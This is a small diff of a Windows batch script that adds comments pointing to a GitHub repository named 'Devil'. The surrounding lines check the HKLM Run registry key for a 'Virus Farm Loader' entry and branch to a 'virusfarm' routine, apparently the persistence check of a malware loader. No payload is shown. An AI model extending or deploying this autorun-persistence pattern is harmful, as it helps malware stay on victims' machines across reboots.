@@ -1,4 +1,7 @@
 @echo off
+::My Github is
+::https://github.com/The-Joker-Official/Devil
+
 title Loading...
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "Virus Farm Loader"
 if %errorlevel%==0 goto virusfarm
